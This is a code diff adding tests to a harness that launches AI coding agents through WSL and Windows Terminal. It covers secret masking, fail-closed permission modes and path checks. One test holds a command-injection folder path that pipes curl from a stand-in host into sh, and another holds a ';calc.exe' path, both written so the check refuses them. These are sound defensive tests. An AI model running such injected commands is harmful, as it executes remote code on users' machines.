@@ -14,6 +14,15 @@ process.env.PILOTAGE_DATA = fs.mkdtempSync(path.join(os.tmpdir(), 'pilotage-harn
 // Launch tests check the WSL + Windows Terminal path (refusals before anything starts) on every OS. Outside WSL a
 // Claude terminal launch would fall back to a real `claude --bg`, which a test must never start.
 process.env.PILOTAGE_WSL = '1';
+// A fake Windows profile with a stand-in wt.exe that does nothing: the tests never use the real Windows profile or
+// open a real Windows Terminal tab, and without a wt.exe Claude launches would fall back to a real `claude --bg`.
+{
+  const winHome = fs.mkdtempSync(path.join(os.tmpdir(), 'pilotage-harness-winhome-'));
+  const apps = path.join(winHome, 'AppData', 'Local', 'Microsoft', 'WindowsApps');
+  fs.mkdirSync(apps, { recursive: true });
+  fs.writeFileSync(path.join(apps, 'wt.exe'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
+  process.env.PILOTAGE_WIN_HOME = winHome;
+}
 process.env.CODEX_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'pilotage-codex-home-')); // never the real ~/.codex
 const { ensureDirs, paths } = await import('../server/config.js');
 ensureDirs();
@@ -386,6 +395,38 @@ test('openai-compatible provider against a local mock: key header, schema fallba
   }
 });
 
+test('callAI masks secrets in what it sends, whatever the job put in (CLAUDE.md, memory, READMEs, notes)', async () => {
+  const bodies = [];
+  const server = http.createServer((req, res) => {
+    let body = '';
+    req.on('data', (c) => (body += c));
+    req.on('end', () => {
+      bodies.push(body);
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ model: 'mock-1', choices: [{ finish_reason: 'stop', message: { role: 'assistant', content: '{"ok": true, "word": "pong"}' } }] }));
+    });
+  });
+  await new Promise((r) => server.listen(0, '127.0.0.1', r));
+  const port = server.address().port;
+  try {
+    getStore().patchSettings({ ai: { provider: 'openai-compatible', dailyCallCap: 0, providers: { 'openai-compatible': { preset: 'custom', baseUrl: `http://127.0.0.1:${port}/v1`, model: 'mock-1', schemaMode: 'json_object' } } } });
+    P.setProviderKey('custom', 'sk-test-0123456789abcd');
+    // Assembled at runtime so no secret-shaped literal sits in the repo.
+    const stripe = 'sk_' + 'live_' + 'abcdefghijklmnop1234';
+    const dbPass = 'Sup3rS3cretPw';
+    const input = `# CLAUDE.md\nSTRIPE_SECRET_KEY=${stripe}\nDatabase: postgres://admin:${dbPass}@db.example.com/app\n`;
+    const r = await P.callAI({ instruction: 'Summarize.', input, schema: P.TEST_SCHEMA });
+    assert.equal(r.ok, true, r.error);
+    assert.equal(bodies.length, 1);
+    assert.ok(!bodies[0].includes(stripe), 'the Stripe key was sent');
+    assert.ok(!bodies[0].includes(dbPass), 'the database password was sent');
+    assert.match(bodies[0], /\[hidden\]/);
+  } finally {
+    server.close();
+    getStore().patchSettings({ ai: { provider: 'claude-cli', dailyCallCap: 300 } });
+  }
+});
+
 test('provider routes: keys are stored 0600 and never returned', async () => {
   const handlers = {};
   const out = {};
@@ -426,6 +467,19 @@ test('provider routes: keys are stored 0600 and never returned', async () => {
   assert.equal(cleanBaseUrl('file:///etc/passwd'), null);
   await handlers['PATCH /api/harnesses'](null, null, { body: { extraClaudeDirs: ['/definitely/not/here'] } });
   assert.equal(out.status, 400);
+});
+
+test('permission modes fail closed: unknown, mistyped or "default" ask first; only bypassPermissions skips prompts', () => {
+  for (const m of ['default', 'manual', 'bogus', 'Default', 'ask', '', undefined]) {
+    assert.deepEqual(L.harnessPermissionArgs('claude', m), ['--permission-mode', 'default'], `claude ${m}`);
+    assert.deepEqual(L.harnessPermissionArgs('codex', m), [], `codex ${m}`);
+    assert.deepEqual(L.harnessPermissionArgs('gemini', m), ['--approval-mode', 'default'], `gemini ${m}`);
+  }
+  assert.deepEqual(L.harnessPermissionArgs('claude', 'bypassPermissions'), ['--dangerously-skip-permissions']);
+  assert.deepEqual(L.harnessPermissionArgs('codex', 'bypassPermissions'), ['--dangerously-bypass-approvals-and-sandbox']);
+  assert.deepEqual(L.harnessPermissionArgs('claude', 'acceptEdits'), ['--permission-mode', 'acceptEdits']);
+  assert.deepEqual(L.harnessPermissionArgs('claude', 'plan'), ['--permission-mode', 'plan']);
+  assert.deepEqual(L.harnessPermissionArgs('claude', 'auto'), ['--permission-mode', 'auto']);
 });
 
 test('codex / gemini launch commands (built, not launched)', () => {
@@ -477,11 +531,14 @@ test('non-Claude launches: background refused, gemini resume refused (nothing st
 });
 
 test('paths with ";" are refused before Windows Terminal is called', async () => {
-  const msg = /Folder path contains ";" which Windows Terminal cannot handle safely/;
+  const msg = /Folder path contains ";" or .". which Windows Terminal cannot handle safely/;
   const dir = path.join(tmp('pl-semi-'), 'a;b');
   fs.mkdirSync(dir);
   assert.throws(() => L.assertWtSafe('/home/x;calc.exe'), msg);
   assert.doesNotThrow(() => L.assertWtSafe('/home/x/y'));
+  // Windows Terminal re-quotes arguments with spaces without escaping inner quotes, and wsl.exe runs what follows
+  // `--`: a folder named like this would run a command when a session or shell is opened there.
+  assert.throws(() => L.assertWtSafe('/home/x/a" -- curl -s x.example|sh #'), /Windows Terminal cannot handle safely/);
   for (const harness of ['claude', 'codex', 'gemini']) {
     const r = await L.launch({ cwd: dir, name: 'n;ame', prompt: 'hi', mode: 'terminal', harness });
     assert.equal(r.state, 'error', harness);
